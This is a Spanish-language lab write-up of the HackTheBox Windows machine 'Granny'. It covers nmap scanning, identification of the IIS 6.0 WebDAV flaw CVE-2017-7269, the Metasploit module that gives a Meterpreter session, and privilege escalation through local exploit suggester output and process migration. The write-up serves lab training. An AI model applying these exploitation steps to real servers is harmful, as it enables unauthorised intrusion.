# Gramy

Plataforma: HackTheBox
OS: Windows
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 9 de marzo de 2025 16:17
IP: 10.10.11.35

## Recopilación de información

<aside>
💡 Reconocimiento general

</aside>

System

```bash
	10.10.10.15 (ttl -> 127): Windows
```

**Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.15 -oG allports

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
ORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-ntlm-info: 
|   Target_Name: GRANNY
|   NetBIOS_Domain_Name: GRANNY
|   NetBIOS_Computer_Name: GRANNY
|   DNS_Domain_Name: granny
|   DNS_Computer_Name: granny
|_  Product_Version: 5.2.3790
| http-webdav-scan: 
|   Server Date: Sun, 09 Mar 2025 15:34:36 GMT
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Whatweb

```jsx
whatweb http://10.10.10.15
http://10.10.10.15 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/6.0], IP[10.10.10.15], Microsoft-IIS[6.0][Under Construction], MicrosoftOfficeWebServer[5.0_Pub], UncommonHeaders[microsoftofficewebserver], X-Powered-By[ASP.NET]

```

- **Identificación de vulnerabilidades**

Siguiendo los comentarios de HTB vemos que la maquina usa IIS6 con webDav. Por lo que buscamos vulenrabilidades asociadas. Encontramos : 

- CVE-2017-7269

## Explotación

<aside>
💡 Probamos diferentes accesos

</aside>

### Explotación 1

Metasploit

```bash
Buscamos CVE:

Search CVE-2017-7269
use windows/iis/iis_webdav_scstoragepathfromurl

Ganamos una sesion de meterpreter
```

### Escalada de privilegios

Una vez ganamos acceso a la maquina, buscamos posibles formas de elevar privilegios con:

```bash
msf> use multi/recon/local_exploit_suggester
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
```

Nos muestra 6 posibles formas

Probamos el primero, pero al ejecutar el proceso, nos muestra un error: 

```jsx
[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
```

Para evitar que entre en conflicto con la otra sesion de meterpreter que tenemos abierta, debemos migrar el proceso de la otra sesion de meterpreter a otro proceso:

```jsx
Hacemos ps para mostrar los procesos y escogemos uno que podamos migrar
miramos el numero de proceso 
msf> migrate 1962 (por ejemplo)

```

Con esto, ya nos deja luego ejecutar la otra sesion sin error.

Buscamos las flags en : 

```jsx
\Documents and Settings\Larkis
\Documents and Settings\Administrator
```

##